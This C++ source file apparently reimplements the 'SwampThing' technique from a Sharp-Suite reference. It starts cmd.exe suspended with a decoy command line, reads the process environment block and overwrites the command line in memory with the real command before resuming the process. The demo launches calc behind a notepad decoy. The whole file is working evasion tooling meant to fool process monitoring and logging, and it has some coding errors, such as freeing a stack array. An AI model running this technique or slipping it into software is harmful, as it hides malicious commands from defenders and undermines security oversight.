//Implementing SwampThing with C++
//Reference: https://github.com/FuzzySecurity/Sharp-Suite/tree/master/SwampThing

#include <windows.h>
#include <Ntsecapi.h>

typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID ProcessInformation,
	DWORD ProcessInformationLength,
	PDWORD ReturnLength
	);
	
struct PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	LPCVOID PebBaseAddress;
	PVOID Reserved2[2];
	DWORD UniqueProcessId;
	PVOID Reserved3;
};

int SpawnTheThing(char *Launch, char *FakeCmdLine, char *RealCmdLineChar)
{
	//char to wchar
	wchar_t RealCmdLineWchar[100];
	swprintf(RealCmdLineWchar, 100, L"%hs", RealCmdLineChar);
	_wcslwr_s(RealCmdLineWchar, wcslen(RealCmdLineWchar) + 1);

	int err = 0;
	// determine if 64 or 32-bit processor
	SYSTEM_INFO si;
	GetNativeSystemInfo(&si);
	if(si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
		printf("[+]System Arch:64-bit\r\n");		
	else
		printf("[+]System Arch:32-bit\r\n");
	// determine if this process is running on WOW64
	BOOL wow;
	IsWow64Process(GetCurrentProcess(), &wow);
	if (wow)
	{
		printf("[!]PE Arch:32-bit\r\n");
		printf("[!]You need to use the 64-bit PE\r\n");
		return 0;
	}
	// use WinDbg "dt ntdll!_PEB" command and search for ProcessParameters offset to find the truth out
	DWORD ProcessParametersOffset = si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? 0x20 : 0x10;
	DWORD CommandLineOffset = si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? 0x70 : 0x40;

	// read basic info to get ProcessParameters address, we only need the beginning of PEB
	DWORD pebSize = ProcessParametersOffset + 8;
	PBYTE peb = (PBYTE)malloc(pebSize);
	ZeroMemory(peb, pebSize);

	// read basic info to get CommandLine address, we only need the beginning of ProcessParameters
	DWORD ppSize = CommandLineOffset + 16;
	PBYTE pp = (PBYTE)malloc(ppSize);
	ZeroMemory(pp, ppSize);

	PWSTR cmdLine;
	LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
	//  hide window
	//	pStartupInfo->wShowWindow = SW_HIDE;
	//	pStartupInfo->dwFlags = STARTF_USESHOWWINDOW;
	LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
	printf("[*]CreateProcess -> Suspended\r\n");
	CreateProcessA
	(
		Launch,
		FakeCmdLine,
		0,
		0,
		0,
		CREATE_SUSPENDED,
		0,
		0,
		pStartupInfo,
		pProcessInfo
	);

	if (!pProcessInfo->hProcess)
	{
		printf("[!]Error creating process\r\n");
		return 0;
	}

	PROCESS_BASIC_INFORMATION pbi;
	ZeroMemory(&pbi, sizeof(pbi));

	// get process information
	_NtQueryInformationProcess query = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	err = query(pProcessInfo->hProcess, 0, &pbi, sizeof(pbi), NULL);
	if (err != 0)
	{
		CloseHandle(pProcessInfo->hProcess);
		free(peb);
		free(pp);
		printf("[!]NtQueryInformationProcess failed\r\n");
		return 0;
	}

	// read PEB
	if (!ReadProcessMemory(pProcessInfo->hProcess, pbi.PebBaseAddress, peb, pebSize, NULL))
	{
		CloseHandle(pProcessInfo->hProcess);
		free(peb);
		free(pp);
		printf("[!]ReadProcessMemory PEB failed\r\n");
		return 0;
	}

	// read ProcessParameters
	PBYTE* parameters = (PBYTE*)*(LPVOID*)(peb + ProcessParametersOffset); // address in remote process adress space
	if (!ReadProcessMemory(pProcessInfo->hProcess, parameters, pp, ppSize, NULL))
	{
		CloseHandle(pProcessInfo->hProcess);
		free(peb);
		free(pp);
		printf("[!]ReadProcessMemory Parameters failed\r\n");
		return 0;
	}

	printf("[*]ReadProcessMemory -> commandline -> ");
	// read CommandLine
	UNICODE_STRING* pCommandLine = (UNICODE_STRING*)(pp + CommandLineOffset);
	cmdLine = (PWSTR)malloc(pCommandLine->MaximumLength);
	if (!ReadProcessMemory(pProcessInfo->hProcess, pCommandLine->Buffer, cmdLine, pCommandLine->MaximumLength, NULL))
	{
		printf("Failed\r\n");
		CloseHandle(pProcessInfo->hProcess);
		free(peb);
		free(pp);
		free(cmdLine);
		printf("[!]ReadProcessMemory Parameters failed\r\n");
		return 0;
	}
	printf("Success\r\n");

	printf("[+]Commandline:%ws\n", cmdLine);
	printf("[*]WriteProcessMemory -> commandline -> ");
	// write CommandLine
	if (!WriteProcessMemory(pProcessInfo->hProcess, pCommandLine->Buffer, RealCmdLineWchar, pCommandLine->MaximumLength, NULL))
	{
		printf("Failed\r\n");
		CloseHandle(pProcessInfo->hProcess);
		free(peb);
		free(pp);
		free(cmdLine);
		free(RealCmdLineWchar);
		printf("[!]WriteProcessMemory Parameters failed\r\n");
		return 0;
	}
	printf("Success\r\n");
	printf("[*]ReadProcessMemory again -> commandline -> ");
	// read CommandLine again
	if (!ReadProcessMemory(pProcessInfo->hProcess, pCommandLine->Buffer, cmdLine, pCommandLine->MaximumLength, NULL))
	{
		printf("Failed\r\n");
		CloseHandle(pProcessInfo->hProcess);
		free(peb);
		free(pp);
		free(cmdLine);
		free(RealCmdLineWchar);
		printf("[!]ReadProcessMemory Parameters failed\r\n");
		return 0;
	}
	printf("Success\r\n");

	printf("[+]New Commandline:%ws\r\n", cmdLine);
	free(peb);
	free(pp);
	free(cmdLine);
	// ResumeThread
	printf("[+]ResumeThread -> ", cmdLine);
	if (ResumeThread(pProcessInfo->hThread) == -1)
		printf("Failed\r\n");
	printf("Success\r\n");

	return 1;
}

int main(int argc, char* argv[])
{
	SpawnTheThing("c:\\windows\\system32\\cmd.exe", "/c start notepad.exe", "/c start calc.exe");
	return 1;
}

